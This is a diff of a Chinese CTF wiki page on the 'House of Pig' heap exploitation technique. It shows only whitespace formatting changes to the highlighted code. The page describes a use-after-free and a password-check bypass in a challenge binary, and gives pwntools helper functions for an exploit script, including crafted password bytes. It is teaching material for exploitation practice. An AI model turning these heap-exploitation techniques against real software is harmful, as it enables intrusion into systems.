@@ -27,7 +27,7 @@
 <span class=w>  </span><span class=kt>int</span><span class=w> </span><span class=n>view_times_left</span><span class=p>;</span>
 <span class=w>  </span><span class=kt>int</span><span class=w> </span><span class=n>edit_times_left</span><span class=p>;</span>
 <span class=p>};</span>
-</code></pre></div> <p>把这两个结构体补全后，程序的流程就会容易分析许多，可以发现主要的漏洞是在改变猪猪的时候，备份和更新结构体时未对 des_exist_sign[24] 数组更新</p> <p><img alt src=../figure/backup-operation.png></p> <p><img alt src=../figure/copy-operation.png></p> <p>要触发这个未更新的漏洞需要更改角色，要通过一个 check_password 的操作。</p> <p><img alt src=../figure/checkpassword-operation.png></p> <p>也就是需要输入三个 md5 值之一的原值，注意到最后一个 md5 被 '\x00' 截断了，所以只要前两位相同即可，可以尝试使用爆破等方法通过此处的检测，下面是一种方法。</p> <div class=highlight><pre><span></span><code><span class=k>def</span> <span class=nf>change_rol</span><span class=p>(</span><span class=n>role</span><span class=p>):</span>
+</code></pre></div> <p>把这两个结构体补全后，程序的流程就会容易分析许多，可以发现主要的漏洞是在改变猪猪的时候，备份和更新结构体时未对 des_exist_sign[24] 数组更新</p> <p><img alt src=../figure/backup-operation.png></p> <p><img alt src=../figure/copy-operation.png></p> <p>要触发这个未更新的漏洞需要更改角色，要通过一个 check_password 的操作。</p> <p><img alt src=../figure/checkpassword-operation.png></p> <p>也就是需要输入三个 md5 值之一的原值，注意到最后一个 md5 被 '\x00' 截断了，所以只要前两位相同即可，可以尝试使用爆破等方法通过此处的检测，下面是一种方法。</p> <div class=highlight><pre><span></span><code><span class=k>def</span><span class=w> </span><span class=nf>change_rol</span><span class=p>(</span><span class=n>role</span><span class=p>):</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&quot;Choice: &quot;</span><span class=p>,</span><span class=s1>&#39;5&#39;</span><span class=p>)</span>
     <span class=k>if</span> <span class=p>(</span><span class=n>role</span> <span class=o>==</span> <span class=mi>1</span><span class=p>):</span>
         <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&quot;user:</span><span class=se>\n</span><span class=s2>&quot;</span><span class=p>,</span><span class=s2>&quot;A</span><span class=se>\x01\x95\xc9\x1c</span><span class=s2>&quot;</span><span class=p>)</span>
@@ -37,29 +37,29 @@
         <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&quot;user:</span><span class=se>\n</span><span class=s2>&quot;</span><span class=p>,</span><span class=s2>&quot;C</span><span class=se>\x01\xf7\x3c\x32</span><span class=s2>&quot;</span><span class=p>)</span>
 </code></pre></div> <p>总结一下，程序主要的漏洞点是有 UAF，可以 show，可以 edit，分别有 2 和 8 次机会。最大可以申请 0x440 大小的空间，即可以使 chunk 进入 unsorted bin 和 large bin。整个程序中不存在 malloc 函数，全部是 calloc，由此函数的不从 tcache 中取出 chunk 的性质，且不可以申请 fastbin 范围中的 chunk，导致利用比较困难。</p> <h4 id=house-of-pig_1>通过 House of Pig 实现利用<a class=headerlink href=#house-of-pig_1 title="Permanent link">&para;</a></h4> <div class=highlight><pre><span></span><code><span class=ch>#!/usr/bin/env python</span>
 <span class=c1># coding=utf-8</span>
-<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+<span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
 <span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&quot;tmux&quot;</span><span class=p>,</span><span class=s2>&quot;splitw&quot;</span><span class=p>,</span><span class=s2>&quot;-h&quot;</span><span class=p>]</span>
 
-<span class=k>def</span> <span class=nf>add_message</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=n>payload</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>add_message</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=n>payload</span><span class=p>):</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&quot;Choice: &quot;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&quot;size: &quot;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&quot;message: &quot;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
 
-<span class=k>def</span> <span class=nf>view_message</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>view_message</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&quot;Choice: &quot;</span><span class=p>,</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&quot;index: &quot;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
 
-<span class=k>def</span> <span class=nf>edit_message</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span><span class=n>payload</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>edit_message</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span><span class=n>payload</span><span class=p>):</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&quot;Choice: &quot;</span><span class=p>,</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&quot;index: &quot;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&quot;message: &quot;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
 
-<span class=k>def</span> <span class=nf>delete_message</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>delete_message</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&quot;Choice: &quot;</span><span class=p>,</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&quot;index: &quot;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
 
-<span class=k>def</span> <span class=nf>change_rol</span><span class=p>(</span><span class=n>role</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>change_rol</span><span class=p>(</span><span class=n>role</span><span class=p>):</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&quot;Choice: &quot;</span><span class=p>,</span><span class=s1>&#39;5&#39;</span><span class=p>)</span>
     <span class=k>if</span> <span class=p>(</span><span class=n>role</span> <span class=o>==</span> <span class=mi>1</span><span class=p>):</span>
         <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&quot;user:</span><span class=se>\n</span><span class=s2>&quot;</span><span class=p>,</span><span class=s2>&quot;A</span><span class=se>\x01\x95\xc9\x1c</span><span class=s2>&quot;</span><span class=p>)</span>
